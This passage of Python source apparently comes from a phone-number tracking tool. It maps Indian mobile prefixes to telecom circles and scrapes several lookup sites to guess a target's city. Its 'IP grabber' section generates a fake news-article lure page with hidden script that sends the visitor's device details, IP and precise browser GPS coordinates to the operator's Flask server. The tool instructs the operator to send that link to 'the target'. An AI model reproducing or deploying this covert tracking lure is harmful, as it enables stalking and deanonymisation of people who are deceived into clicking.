        "8607": ("Haryana", "Gurgaon"), "8708": ("Haryana", "Gurgaon"),
        "8814": ("Haryana", "Gurgaon"), "8816": ("Haryana", "Gurgaon"),
        "8901": ("Haryana", "Gurgaon"), "8930": ("Haryana", "Gurgaon"),
        # HIMACHAL PRADESH
        "9817": ("Himachal Pradesh", "Una"),
        "9418": ("Himachal Pradesh", "Shimla"),
        "9459": ("Himachal Pradesh", "Shimla"),
        "9805": ("Himachal Pradesh", "Shimla"),
        "9816": ("Himachal Pradesh", "Shimla"),
        "9857": ("Himachal Pradesh", "Mandi"),
        "9882": ("Himachal Pradesh", "Kullu"),
        "9625": ("Himachal Pradesh", "Solan"),
        "9736": ("Himachal Pradesh", "Shimla"),
        "9318": ("Himachal Pradesh", "Shimla"),
        "9218": ("Himachal Pradesh", "Shimla"),
        "7018": ("Himachal Pradesh", "Shimla"),
        "7807": ("Himachal Pradesh", "Shimla"),
        "7831": ("Himachal Pradesh", "Shimla"),
        "7832": ("Himachal Pradesh", "Mandi"),
        "7833": ("Himachal Pradesh", "Kangra"),
        "7876": ("Himachal Pradesh", "Shimla"),
        "8091": ("Himachal Pradesh", "Shimla"),
        "8219": ("Himachal Pradesh", "Shimla"),
        "8262": ("Himachal Pradesh", "Shimla"),
        "8263": ("Himachal Pradesh", "Mandi"),
        "8278": ("Himachal Pradesh", "Shimla"),
        "8351": ("Himachal Pradesh", "Kangra"),
        "8544": ("Himachal Pradesh", "Shimla"),
        "8580": ("Himachal Pradesh", "Shimla"),
        "8626": ("Himachal Pradesh", "Shimla"),
        "8627": ("Himachal Pradesh", "Kangra"),
        "8628": ("Himachal Pradesh", "Mandi"),
        "8679": ("Himachal Pradesh", "Shimla"),
        "8894": ("Himachal Pradesh", "Shimla"),
        "8988": ("Himachal Pradesh", "Shimla"),
        "9419": ("J&K", "Srinagar"), "9469": ("J&K", "Jammu"),
        "9596": ("J&K", "Srinagar"), "9622": ("J&K", "Srinagar"),
        "9682": ("J&K", "Jammu"), "9697": ("J&K", "Srinagar"),
        "9906": ("J&K", "Srinagar"), "7006": ("J&K", "Srinagar"),
        "8491": ("J&K", "Jammu"), "8492": ("J&K", "Srinagar"),
        "8803": ("J&K", "Jammu"),
        "9826": ("Madhya Pradesh", "Bhopal"), "9827": ("Madhya Pradesh", "Indore"),
        "9893": ("Madhya Pradesh", "Bhopal"), "9907": ("Madhya Pradesh", "Bhopal"),
        "9926": ("Madhya Pradesh", "Bhopal"), "9981": ("Madhya Pradesh", "Bhopal"),
        "7049": ("Madhya Pradesh", "Bhopal"), "7067": ("Madhya Pradesh", "Bhopal"),
        "7354": ("Madhya Pradesh", "Bhopal"), "7389": ("Madhya Pradesh", "Indore"),
        "7415": ("Madhya Pradesh", "Bhopal"), "7470": ("Madhya Pradesh", "Bhopal"),
        "7566": ("Madhya Pradesh", "Bhopal"), "7697": ("Madhya Pradesh", "Bhopal"),
        "7771": ("Madhya Pradesh", "Bhopal"), "7828": ("Madhya Pradesh", "Bhopal"),
        "7879": ("Madhya Pradesh", "Bhopal"), "7999": ("Madhya Pradesh", "Bhopal"),
        "8085": ("Madhya Pradesh", "Bhopal"), "8109": ("Madhya Pradesh", "Bhopal"),
        "8120": ("Madhya Pradesh", "Bhopal"), "8269": ("Madhya Pradesh", "Bhopal"),
        "8435": ("Madhya Pradesh", "Bhopal"), "8770": ("Madhya Pradesh", "Bhopal"),
        "8827": ("Madhya Pradesh", "Bhopal"), "8871": ("Madhya Pradesh", "Bhopal"),
        "8962": ("Madhya Pradesh", "Bhopal"),
        "9846": ("Kerala", "Kochi"), "9847": ("Kerala", "Kochi"),
        "9895": ("Kerala", "Kochi"), "9946": ("Kerala", "Kochi"),
        "9961": ("Kerala", "Kochi"), "9995": ("Kerala", "Kochi"),
        "9496": ("Kerala", "Kochi"), "7012": ("Kerala", "Kochi"),
        "7025": ("Kerala", "Kochi"), "7306": ("Kerala", "Kochi"),
        "7510": ("Kerala", "Kochi"), "7736": ("Kerala", "Kochi"),
        "7902": ("Kerala", "Kochi"), "7994": ("Kerala", "Kochi"),
        "8075": ("Kerala", "Kochi"), "8086": ("Kerala", "Kochi"),
        "8111": ("Kerala", "Kochi"), "8129": ("Kerala", "Kochi"),
        "8281": ("Kerala", "Kochi"), "8547": ("Kerala", "Kochi"),
        "8589": ("Kerala", "Kochi"), "8606": ("Kerala", "Kochi"),
        "8848": ("Kerala", "Kochi"), "8921": ("Kerala", "Kochi"),
        "9006": ("Bihar", "Patna"), "9102": ("Bihar", "Patna"),
        "9162": ("Bihar", "Ranchi"), "9199": ("Bihar", "Patna"),
        "9234": ("Bihar", "Patna"), "9304": ("Bihar", "Patna"),
        "9334": ("Bihar", "Patna"), "9431": ("Bihar", "Ranchi"),
        "9470": ("Bihar", "Ranchi"), "9534": ("Bihar", "Patna"),
        "9570": ("Bihar", "Ranchi"), "9608": ("Bihar", "Patna"),
        "9631": ("Bihar", "Patna"), "9661": ("Bihar", "Patna"),
        "9709": ("Bihar", "Ranchi"), "9771": ("Bihar", "Patna"),
        "9835": ("Bihar", "Ranchi"), "9905": ("Bihar", "Patna"),
        "9931": ("Bihar", "Patna"), "9955": ("Bihar", "Patna"),
        "7033": ("Bihar", "Patna"), "7070": ("Bihar", "Patna"),
        "7209": ("Bihar", "Patna"), "7250": ("Bihar", "Ranchi"),
        "7277": ("Bihar", "Patna"), "7488": ("Bihar", "Patna"),
        "7631": ("Bihar", "Patna"), "7903": ("Bihar", "Patna"),
        "7979": ("Bihar", "Ranchi"), "8002": ("Bihar", "Patna"),
        "8051": ("Bihar", "Patna"), "8210": ("Bihar", "Patna"),
        "8271": ("Bihar", "Patna"), "8434": ("Bihar", "Patna"),
        "8521": ("Bihar", "Patna"), "8757": ("Bihar", "Patna"),
        "8809": ("Bihar", "Patna"), "8986": ("Bihar", "Ranchi"),
        "9040": ("Odisha", "Bhubaneswar"), "9078": ("Odisha", "Bhubaneswar"),
        "9178": ("Odisha", "Bhubaneswar"), "9337": ("Odisha", "Bhubaneswar"),
        "9437": ("Odisha", "Bhubaneswar"), "9556": ("Odisha", "Bhubaneswar"),
        "9776": ("Odisha", "Bhubaneswar"), "9853": ("Odisha", "Bhubaneswar"),
        "9937": ("Odisha", "Bhubaneswar"),
        "9435": ("Assam", "Guwahati"), "9612": ("Assam", "Guwahati"),
        "9613": ("Assam", "Guwahati"), "9678": ("Assam", "Guwahati"),
        "9706": ("Assam", "Guwahati"), "9854": ("Assam", "Guwahati"),
        "9864": ("Assam", "Guwahati"), "7002": ("Assam", "Guwahati"),
        "8011": ("Assam", "Guwahati"), "8134": ("Assam", "Guwahati"),
        "8575": ("Assam", "Guwahati"), "8638": ("Assam", "Guwahati"),
        "8876": ("Assam", "Guwahati"),
        "9410": ("Uttarakhand", "Dehradun"), "9411": ("Uttarakhand", "Dehradun"),
        "9412": ("Uttarakhand", "Dehradun"), "9456": ("Uttarakhand", "Dehradun"),
        "9536": ("Uttarakhand", "Dehradun"), "9557": ("Uttarakhand", "Dehradun"),
        "9639": ("Uttarakhand", "Dehradun"), "9719": ("Uttarakhand", "Dehradun"),
        "9720": ("Uttarakhand", "Dehradun"), "9760": ("Uttarakhand", "Dehradun"),
        "9837": ("Uttarakhand", "Dehradun"), "9897": ("Uttarakhand", "Dehradun"),
        "9917": ("Uttarakhand", "Dehradun"), "7055": ("Uttarakhand", "Dehradun"),
        "7248": ("Uttarakhand", "Dehradun"), "7302": ("Uttarakhand", "Dehradun"),
        "7895": ("Uttarakhand", "Dehradun"), "8126": ("Uttarakhand", "Dehradun"),
        "8755": ("Uttarakhand", "Dehradun"),
        "9039": ("Chhattisgarh", "Raipur"), "9200": ("Chhattisgarh", "Raipur"),
        "9300": ("Chhattisgarh", "Raipur"), "9301": ("Chhattisgarh", "Raipur"),
        "9406": ("Chhattisgarh", "Raipur"), "9424": ("Chhattisgarh", "Raipur"),
        "9575": ("Chhattisgarh", "Raipur"), "9669": ("Chhattisgarh", "Raipur"),
        "9752": ("Chhattisgarh", "Raipur"), "9770": ("Chhattisgarh", "Raipur"),
        "9422": ("Goa", "Panaji"), "9511": ("Goa", "Panaji"),
        "9764": ("Goa", "Panaji"), "9765": ("Goa", "Panaji"),
    }

    def detect_telecom_circle(self):
        """Detect Indian telecom circle from prefix (SIM registration only)."""
        if self.country_code != "+91":
            console.print("[dim]  Telecom circle detection is India-only.[/dim]")
            return
        nat = self.national_number.replace(" ", "")
        if len(nat) < 4:
            return
        prefix = nat[:4]
        if prefix in self.INDIA_CIRCLE_DB:
            circle, city = self.INDIA_CIRCLE_DB[prefix]
            self.telecom_circle = {"circle": circle, "city": city}
            self.sim_registration_city = city
            if not self.city:
                self.city = city
            self.basic_info["location"] = city
            self.msc_location = city
            console.print(f"[green]  Telecom Circle: {circle}[/green]")
            console.print(f"[green]  SIM Registered City: {city}[/green]")
            console.print(f"[yellow]  NOTE: This is where SIM was ACTIVATED, not current location[/yellow]")
        else:
            prefix3 = nat[:3]
            for p, (circle, city) in self.INDIA_CIRCLE_DB.items():
                if p.startswith(prefix3):
                    self.telecom_circle = {"circle": circle, "city": city}
                    self.sim_registration_city = city
                    if not self.city:
                        self.city = city
                    self.basic_info["location"] = city
                    self.msc_location = city
                    console.print(f"[yellow]  Approximate Circle: {circle} ({city})[/yellow]")
                    return
            console.print("[yellow]  Prefix not in DB, using phonenumbers lib.[/yellow]")
            if self.region:
                self.telecom_circle = {"circle": self.region, "city": self.city or self.region}

    # =====================================================================
    # PART 3: LIVE LOCATION - MULTI-API CROSS REFERENCE + IP GRABBER
    # =====================================================================
    def _get_session(self):
        if not self._session:
            self._session = requests.Session()
            self._session.headers.update({
                "User-Agent": random.choice(USER_AGENTS),
                "Accept": "application/json, text/html, */*",
                "Accept-Language": "en-US,en;q=0.9",
            })
        return self._session

    def _add_vote(self, city, source, confidence, extra=""):
        """Add a location vote from an API source."""
        if city and city.lower() not in ["unknown", "n/a", "", "india"]:
            vote = {"city": city.strip().title(), "source": source,
                    "confidence": confidence, "extra": extra}
            self.all_votes.append(vote)

    def _consensus_vote(self):
        """Determine best location using majority voting across all APIs."""
        votes = self.all_votes
        if not votes:
            return
        # Count weighted votes per city
        city_scores = {}
        for v in votes:
            c = v["city"].lower().strip()
            # Normalize common variations
            if c in ["new delhi", "delhi ncr"]:
                c = "delhi"
            if c in ["bengaluru"]:
                c = "bangalore"
            if c in ["gurugram"]:
                c = "gurgaon"
            if c in ["mumbai metropolitan region"]:
                c = "mumbai"
            score = v["confidence"]
            if c in city_scores:
                city_scores[c]["score"] += score
                city_scores[c]["count"] += 1
                city_scores[c]["sources"].append(v["source"])
            else:
                city_scores[c] = {"score": score, "count": 1,
                                  "sources": [v["source"]], "original": v["city"]}

        if not city_scores:
            return

        # Best = highest combined score
        best = max(city_scores.items(), key=lambda x: x[1]["score"])
        best_city = best[1]["original"]
        total_apis = len(votes)
        agreeing = best[1]["count"]
        combined_conf = min(0.95, best[1]["score"] / total_apis + (agreeing / total_apis) * 0.3)

        self.live_location["city"] = best_city
        self.live_location["consensus_city"] = best_city
        self.consensus_city = best_city
        self.live_location["method"] = f"Consensus ({agreeing}/{total_apis} APIs)"
        self.live_location["confidence"] = round(combined_conf, 2)

        # Show voting table
        console.print()
        vtable = Table(title="🗳️  LOCATION CROSS-REFERENCE VOTING", border_style="cyan", show_lines=True)
        vtable.add_column("API Source", style="bold white", width=20)
        vtable.add_column("Location Vote", style="green", width=25)
        vtable.add_column("Confidence", style="yellow", width=12)
        for v in votes:
            vtable.add_row(v["source"], v["city"], f"{int(v['confidence']*100)}%")
        vtable.add_row("", "", "")
        vtable.add_row("[bold green]CONSENSUS[/bold green]",
                       f"[bold green]{best_city}[/bold green]",
                       f"[bold green]{int(combined_conf*100)}%[/bold green]")
        console.print(vtable)

    def detect_live_location(self):
        """Master: try ALL methods, then use consensus voting for final answer."""
        console.print(Panel("[bold cyan]PHASE 3: LIVE / ACTIVE LOCATION (MULTI-API)[/bold cyan]",
                          border_style="cyan"))

        # Run all methods in parallel for speed
        methods = [
            ("NumVerify", self._numverify_live),
            ("AbstractAPI", self._abstractapi_live),
            ("IPInfo", self._ipinfo_detect),
            ("FindAndTrace", self._free_network_probe),
            ("VLR/Web", self._vlr_msc_detect),
            ("PhoneInfo", self._phoneinfo_probe),
            ("MobileTracker", self._mobile_tracker_probe),
        ]

        for name, func in methods:
            try:
                with console.status(f"[cyan]  Querying {name}...[/cyan]"):
                    func()
            except Exception as e:
                console.print(f"[dim]  {name} failed: {e}[/dim]")

        # Consensus voting — pick the city with most agreement
        self._consensus_vote()

        # Display final results
        self._display_live_location()

    def _numverify_live(self):
        api_key = os.getenv("NUMVERIFY_API_KEY", "")
        if not api_key:
            return
        try:
            session = self._get_session()
            number = self.phone_number.replace("+", "").replace(" ", "")
            url = f"http://apilayer.net/api/validate?access_key={api_key}&number={number}&format=1"
            resp = session.get(url, timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                if data.get("valid"):
                    loc = data.get("location", "")
                    crr = data.get("carrier", "")
                    lt = data.get("line_type", "")
                    if loc:
                        self._add_vote(loc, "NumVerify", 0.7, f"carrier={crr}")
                    if crr:
                        self.current_carrier = crr
                    if lt:
                        self.line_type = lt
                    console.print(f"[green]  ✓ NumVerify: {loc or 'N/A'} | {crr or 'N/A'} | {lt or 'N/A'}[/green]")
        except Exception as e:
            console.print(f"[dim]  NumVerify: {e}[/dim]")

    def _abstractapi_live(self):
        api_key = os.getenv("ABSTRACT_API_KEY", "")
        if not api_key:
            return
        try:
            session = self._get_session()
            url = f"https://phonevalidation.abstractapi.com/v1/?api_key={api_key}&phone={self.phone_number}"
            resp = session.get(url, timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                if data.get("valid"):
                    loc = data.get("location", "")
                    crr = data.get("carrier", "")
                    if loc:
                        self._add_vote(loc, "AbstractAPI", 0.65)
                    if crr and not self.current_carrier:
                        self.current_carrier = crr
                    console.print(f"[green]  ✓ AbstractAPI: {loc or 'N/A'} | {crr or 'N/A'}[/green]")
        except Exception as e:
            console.print(f"[dim]  AbstractAPI: {e}[/dim]")

    def _ipinfo_detect(self):
        token = os.getenv("IPINFO_TOKEN", "")
        if not token:
            return
        try:
            session = self._get_session()
            resp = session.get(f"https://ipinfo.io/json?token={token}", timeout=8)
            if resp.status_code == 200:
                data = resp.json()
                my_city = data.get("city", "")
                my_region = data.get("region", "")
                my_loc = data.get("loc", "")
                self.live_location["ip_detected"] = True
                self.live_location["ip_location"] = f"{my_city}, {my_region}"
                # This is YOUR IP, so it's useful if scanning your own number
                console.print(f"[green]  ✓ Your IP: {my_city}, {my_region}[/green]")
                console.print(f"[dim]    (Your device location — useful if checking own number)[/dim]")
                if my_loc:
                    try:
                        lat, lon = my_loc.split(",")
                        self.live_location["ip_lat"] = float(lat)
                        self.live_location["ip_lon"] = float(lon)
                    except:
                        pass
        except Exception as e:
            console.print(f"[dim]  IPInfo: {e}[/dim]")

    def _free_network_probe(self):
        try:
            session = self._get_session()
            nat_num = self.national_number.replace(" ", "")
            if self.country_code == "+91":
                url = f"https://www.findandtrace.com/trace-mobile-number-location/{nat_num}"
                resp = session.get(url, timeout=10)
                if resp.status_code == 200:
                    soup = BeautifulSoup(resp.text, 'lxml')
                    tables = soup.find_all("table")
                    for table in tables:
                        rows = table.find_all("tr")
                        for row in rows:
                            cells = row.find_all("td")
                            if len(cells) >= 2:
                                key = cells[0].get_text(strip=True).lower()
                                val = cells[1].get_text(strip=True)
                                if ("circle" in key or "state" in key) and val:
                                    self._add_vote(val, "FindAndTrace", 0.55)
                                    console.print(f"[green]  ✓ FindAndTrace: {val}[/green]")
                                    return
                                elif "operator" in key and val:
                                    if not self.current_carrier:
                                        self.current_carrier = val
        except Exception:
            pass

    def _vlr_msc_detect(self):
        try:
            session = self._get_session()
            nat_num = self.national_number.replace(" ", "")
            if self.country_code == "+91":
                sites = [
                    f"https://www.numberlocator.co.in/trace-mobile-number/{nat_num}",
                    f"https://www.indiatrace.com/trace-mobile-number/{nat_num}",
                ]
                for site_url in sites:
                    try:
                        resp = session.get(site_url, timeout=10, allow_redirects=True)
                        if resp.status_code == 200:
                            soup = BeautifulSoup(resp.text, 'lxml')
                            text = soup.get_text(separator=" ").lower()
                            patterns = [
                                r"currently\s+(?:active|located)\s+in\s+([A-Za-z\s]+)",
                                r"roaming\s+in\s+([A-Za-z\s]+)",
                                r"current\s+location\s*[:\-]\s*([A-Za-z\s,]+)",
                                r"signal\s+area\s*[:\-]\s*([A-Za-z\s,]+)",
                            ]
                            for pat in patterns:
                                match = re.search(pat, text)
                                if match:
                                    loc = match.group(1).strip().title()
                                    if loc and len(loc) > 2 and loc.lower() not in ["india", "unknown", "n/a"]:
                                        self._add_vote(loc, "VLR/Web", 0.5)
                                        console.print(f"[green]  ✓ VLR/Web: {loc}[/green]")
                                        return
                    except Exception:
                        continue
            console.print("[dim]  VLR/MSC: no active location data.[/dim]")
        except Exception:
            pass

    def _phoneinfo_probe(self):
        """Additional phone info API probe."""
        try:
            session = self._get_session()
            nat = self.national_number.replace(" ", "")
            if self.country_code == "+91":
                url = f"https://phoneinfo.io/api/v1/{self.country_code.replace('+','')}{nat}"
                try:
                    resp = session.get(url, timeout=8)
                    if resp.status_code == 200:
                        data = resp.json()
                        loc = data.get("location", data.get("city", data.get("region", "")))
                        if loc:
                            self._add_vote(loc, "PhoneInfo", 0.5)
                            console.print(f"[green]  ✓ PhoneInfo: {loc}[/green]")
                            return
                except Exception:
                    pass
            console.print("[dim]  PhoneInfo: no data.[/dim]")
        except Exception:
            pass

    def _mobile_tracker_probe(self):
        """Additional mobile number tracker sites."""
        try:
            session = self._get_session()
            nat = self.national_number.replace(" ", "")
            if self.country_code == "+91":
                url = f"https://www.mobilenumbertracker.com/trace-mobile-number-location/{nat}"
                try:
                    resp = session.get(url, timeout=8)
                    if resp.status_code == 200:
                        soup = BeautifulSoup(resp.text, 'lxml')
                        tables = soup.find_all("table")
                        for table in tables:
                            for row in table.find_all("tr"):
                                cells = row.find_all("td")
                                if len(cells) >= 2:
                                    key = cells[0].get_text(strip=True).lower()
                                    val = cells[1].get_text(strip=True)
                                    if ("state" in key or "circle" in key or "location" in key) and val:
                                        self._add_vote(val, "MobileTracker", 0.45)
                                        console.print(f"[green]  ✓ MobileTracker: {val}[/green]")
                                        return
                except Exception:
                    pass
            console.print("[dim]  MobileTracker: no data.[/dim]")
        except Exception:
            pass

    def _display_live_location(self):
        """Display live location with consensus results."""
        console.print()
        if self.live_location.get("city"):
            conf = self.live_location.get("confidence", 0)
            method = self.live_location.get("method", "Unknown")
            city = self.live_location["city"]
            conf_color = "green" if conf >= 0.7 else "yellow" if conf >= 0.5 else "red"
            conf_pct = f"{int(conf * 100)}%"

            table = Table(title="📍 LIVE/ACTIVE LOCATION", border_style="cyan", show_lines=True)
            table.add_column("Field", style="bold white", width=25)
            table.add_column("Value", style="green", width=45)
            table.add_row("Active/Current City", f"[bold green]{city}[/bold green]")
            table.add_row("Detection Method", method)
            table.add_row("Confidence", f"[{conf_color}]{conf_pct}[/{conf_color}]")
            if self.sim_registration_city:
                table.add_row("SIM Registered City", f"[yellow]{self.sim_registration_city}[/yellow]")
                sim_norm = self.sim_registration_city.lower().replace("new ", "")
                live_norm = city.lower().replace("new ", "")
                if sim_norm != live_norm:
                    table.add_row("Roaming Status", "[bold yellow]LIKELY ROAMING[/bold yellow]")
                    self.live_location["roaming"] = True
                else:
                    table.add_row("Roaming Status", "[green]Same as SIM circle[/green]")
                    self.live_location["roaming"] = False
            if self.live_location.get("ip_location"):
                table.add_row("Your IP Location", str(self.live_location["ip_location"]))
            if self.current_carrier:
                table.add_row("Carrier", self.current_carrier)
            console.print(table)
        else:
            console.print(Panel(
                "[yellow]Could not determine LIVE location.\n"
                "  Using SIM circle as fallback.[/yellow]",
                title="Live Location", border_style="yellow"))
            if self.sim_registration_city:
                self.live_location["city"] = self.sim_registration_city
                self.live_location["state"] = self.telecom_circle.get("circle", "") if isinstance(self.telecom_circle, dict) else str(self.telecom_circle)
                self.live_location["method"] = "Telecom Circle (fallback)"
                self.live_location["confidence"] = 0.3

    # =====================================================================
    # PART 3B: IP GRABBER LINK — Capture real IP + GPS when target clicks
    # =====================================================================
    def generate_ip_grabber(self, port=8888):
        """Generate an IP grabber tracking link.
        When the target clicks the link, we capture:
        - Their real public IP address
        - IP-based city/state/country
        - Browser GPS (if they allow location permission)
        - User-Agent, device info, screen resolution
        """
        console.print(Panel("[bold red]PHASE 3B: IP GRABBER LINK GENERATOR[/bold red]",
                          border_style="red"))

        # Generate a unique tracking ID
        track_id = hashlib.md5(f"{self.phone_number}{time.time()}".encode()).hexdigest()[:12]

        # Build the tracking page HTML
        tracking_html = self._build_tracking_page(track_id)

        # Save tracking page
        os.makedirs("output", exist_ok=True)
        page_path = f"output/track_{track_id}.html"
        with open(page_path, "w", encoding="utf-8") as f:
            f.write(tracking_html)

        # Results file
        results_path = f"output/grab_{track_id}.json"
        self.ip_grab_results = {"track_id": track_id, "captures": []}

        console.print(f"[bold green]  ✓ Tracking page created: {page_path}[/bold green]")
        console.print()

        # Get local & public IP for link generation
        local_ip = self._get_local_ip()
        public_ip = self._get_public_ip()

        console.print(Panel(f"""[bold yellow]📎 IP GRABBER LINKS — Send one of these to the target:[/bold yellow]

[bold green]  Local Network (same WiFi):[/bold green]
    http://{local_ip}:{port}/t/{track_id}

[bold green]  Public (if port {port} is forwarded / use ngrok):[/bold green]
    http://{public_ip}:{port}/t/{track_id}

[bold cyan]  💡 TIP: Use ngrok for a public HTTPS link:[/bold cyan]
    1. Install: brew install ngrok  (or download from ngrok.com)
    2. Run:     ngrok http {port}
    3. Copy the https://xxxxx.ngrok.io URL
    4. Send:    https://xxxxx.ngrok.io/t/{track_id}

[bold yellow]  The link looks like a normal webpage (news article).[/bold yellow]
[bold yellow]  When target opens it, their IP + location is captured.[/bold yellow]
[bold red]  If they allow browser location → exact GPS coordinates![/bold red]

[dim]  Press Ctrl+C to stop the server when done.[/dim]""",
            title="[bold red]🎯 TRACKING LINKS[/bold red]", border_style="red"))

        # Start the Flask server
        self._start_grab_server(port, track_id, tracking_html, results_path)

    def _get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"

    def _get_public_ip(self):
        try:
            resp = requests.get("https://api.ipify.org?format=json", timeout=5)
            return resp.json().get("ip", "?")
        except:
            return "?.?.?.?"

    def _build_tracking_page(self, track_id):
        """Build a convincing tracking page that captures IP + GPS."""
        return f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Breaking: Major Tech Update — Read Now</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
background:#f8f9fa;color:#333;line-height:1.7}}
.header{{background:#1a1a2e;color:white;padding:15px 20px;text-align:center}}
.header h1{{font-size:1.1em;font-weight:400;opacity:0.9}}
.container{{max-width:700px;margin:20px auto;padding:0 20px}}
.article{{background:white;border-radius:12px;box-shadow:0 2px 20px rgba(0,0,0,0.08);
padding:30px;margin:20px 0}}
.article h2{{font-size:1.5em;margin-bottom:15px;color:#1a1a2e}}
.article p{{margin-bottom:15px;color:#555;font-size:1.05em}}
.article img{{width:100%;border-radius:8px;margin:15px 0}}
.loading{{text-align:center;padding:40px;color:#888}}
.spinner{{display:inline-block;width:40px;height:40px;border:4px solid #e0e0e0;
border-top-color:#3498db;border-radius:50%;animation:spin 1s linear infinite}}
@keyframes spin{{to{{transform:rotate(360deg)}}}}
.meta{{color:#999;font-size:0.85em;margin-bottom:20px}}
</style>
</head>
<body>
<div class="header"><h1>📰 TechPulse Daily</h1></div>
<div class="container">
<div class="article">
<div class="meta">Technology • 2 min read • {datetime.now().strftime('%B %d, %Y')}</div>
<h2>Major Security Update Released — What You Need to Know</h2>
<p>A major security update has been released that affects millions of users worldwide.
Experts recommend updating your devices immediately to protect against newly discovered
vulnerabilities.</p>
<p>The update addresses critical issues in mobile operating systems that could allow
unauthorized access to personal data. Security researchers discovered the vulnerability
during routine testing.</p>
<p>"This is one of the most important updates of the year," said a leading cybersecurity
expert. "Users should update their devices as soon as possible."</p>
<p>The patch is being rolled out globally and should be available within the next 24 hours
for all supported devices.</p>
<div class="loading" id="loading">
<div class="spinner"></div>
<p>Loading additional content...</p>
</div>
</div>
</div>
<script>
// Capture visitor info and send to our server
(function(){{
  var data = {{
    track_id: "{track_id}",
    timestamp: new Date().toISOString(),
    userAgent: navigator.userAgent,
    language: navigator.language,
    platform: navigator.platform,
    screenW: screen.width,
    screenH: screen.height,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    referrer: document.referrer,
    cookiesEnabled: navigator.cookieEnabled,
  }};

  // Try to get GPS location (browser will ask permission)
  if (navigator.geolocation) {{
    navigator.geolocation.getCurrentPosition(
      function(pos) {{
        data.gps_lat = pos.coords.latitude;
        data.gps_lon = pos.coords.longitude;
        data.gps_accuracy = pos.coords.accuracy;
        data.gps_altitude = pos.coords.altitude;
        sendData(data);
      }},
      function(err) {{
        data.gps_error = err.message;
        sendData(data);
      }},
      {{ enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }}
    );
  }} else {{
    data.gps_error = "Geolocation not supported";
    sendData(data);
  }}

  function sendData(d) {{
    fetch("/capture/" + d.track_id, {{
      method: "POST",
      headers: {{ "Content-Type": "application/json" }},
      body: JSON.stringify(d)
    }}).then(function(){{
      document.getElementById("loading").style.display = "none";
    }}).catch(function(){{}});
  }}
}})();
</script>
</body>
</html>"""

    def _start_grab_server(self, port, track_id, tracking_html, results_path):
        """Start a minimal HTTP server for the IP grabber."""
        try:
            from flask import Flask, request, jsonify, Response
        except ImportError:
            console.print("[red]  Flask not installed. Run: pip install flask[/red]")
            return

        import logging
        log = logging.getLogger('werkzeug')
        log.setLevel(logging.ERROR)

        app = Flask(__name__)
        captures = []
        ipinfo_token = os.getenv("IPINFO_TOKEN", "")

        @app.route(f"/t/{track_id}")
        def serve_tracking_page():
            return Response(tracking_html, mimetype="text/html")

        @app.route(f"/capture/{track_id}", methods=["POST"])
        def capture_data():
            data = request.get_json(silent=True) or {}
            # Get the real IP
            real_ip = request.headers.get("X-Forwarded-For", request.headers.get("X-Real-IP", request.remote_addr))
            if real_ip and "," in real_ip:
                real_ip = real_ip.split(",")[0].strip()
            data["captured_ip"] = real_ip
            data["capture_time"] = datetime.now().isoformat()

            # Lookup IP location
            ip_info = {}
            if real_ip and real_ip not in ["127.0.0.1", "::1"]:
                try:
                    tok = f"?token={ipinfo_token}" if ipinfo_token else ""
                    resp = requests.get(f"https://ipinfo.io/{real_ip}/json{tok}", timeout=5)
                    if resp.status_code == 200:
                        ip_info = resp.json()
                except:
                    pass
            data["ip_info"] = ip_info

            captures.append(data)

            # Save to file
            with open(results_path, "w") as f:
                json.dump({"track_id": track_id, "target": self.phone_number,
                          "captures": captures}, f, indent=2, default=str)

            # Print capture alert in real-time
            ip_city = ip_info.get("city", "?")
            ip_region = ip_info.get("region", "?")
            ip_org = ip_info.get("org", "?")
            gps_lat = data.get("gps_lat", None)
            gps_lon = data.get("gps_lon", None)
            gps_acc = data.get("gps_accuracy", None)
            device = data.get("platform", "?")
            tz = data.get("timezone", "?")

            capture_num = len(captures)

            console.print()
            console.print(Panel(f"""[bold red]🚨 TARGET CAPTURED![/bold red]

[bold green]  IP Address:[/bold green]   {real_ip}
[bold green]  IP City:[/bold green]      {ip_city}, {ip_region}
[bold green]  ISP:[/bold green]          {ip_org}
[bold green]  Device:[/bold green]       {device}
[bold green]  Timezone:[/bold green]     {tz}
[bold green]  Browser:[/bold green]      {data.get('userAgent', '?')[:60]}
[bold green]  Screen:[/bold green]       {data.get('screenW', '?')}x{data.get('screenH', '?')}

{'[bold red]  🎯 GPS LOCATION:[/bold red]' if gps_lat else '[yellow]  GPS: Not allowed by target[/yellow]'}
{'  Latitude:  ' + str(gps_lat) if gps_lat else ''}
{'  Longitude: ' + str(gps_lon) if gps_lon else ''}
{'  Accuracy:  ' + str(round(gps_acc, 1)) + ' meters' if gps_acc else ''}

[dim]  Saved to: {results_path}[/dim]""",
                title=f"[bold red]🎯 IP GRAB — CAPTURE #{capture_num}[/bold red]",
                border_style="red"))

            # Update live_location if we got GPS
            if gps_lat and gps_lon:
                self.live_location["lat"] = gps_lat
                self.live_location["lon"] = gps_lon
                self.live_location["method"] = "IP Grabber (GPS)"
                self.live_location["confidence"] = 0.99
                self._add_vote(f"{ip_city}", "IP Grabber", 0.95)
            elif ip_city and ip_city != "?":
                self._add_vote(ip_city, "IP Grabber", 0.85)

            return jsonify({"status": "ok"})

        console.print(f"\n[bold cyan]  🌐 Server running on port {port}...[/bold cyan]")
        console.print(f"[bold cyan]  📡 Waiting for target to click the link...[/bold cyan]")
        console.print(f"[dim]  Press Ctrl+C to stop.[/dim]\n")

        try:
            app.run(host="0.0.0.0", port=port, debug=False)
        except KeyboardInterrupt:
            console.print(f"\n[yellow]  Server stopped. Captures: {len(captures)}[/yellow]")
            if captures:
                console.print(f"[green]  Results saved: {results_path}[/green]")

    # =====================================================================
    # PART 4: ADVANCED GEOLOCATION
    # =====================================================================
    def advanced_geolocate(self, target_city=None):
        console.print(Panel("[bold cyan]PHASE 4: ADVANCED GEOLOCATION[/bold cyan]", border_style="cyan"))
        if not target_city:
            target_city = self.live_location.get("city") or self.sim_registration_city or self.city
        if not target_city:
            console.print("[yellow]  No city found to geocode.[/yellow]")
            return
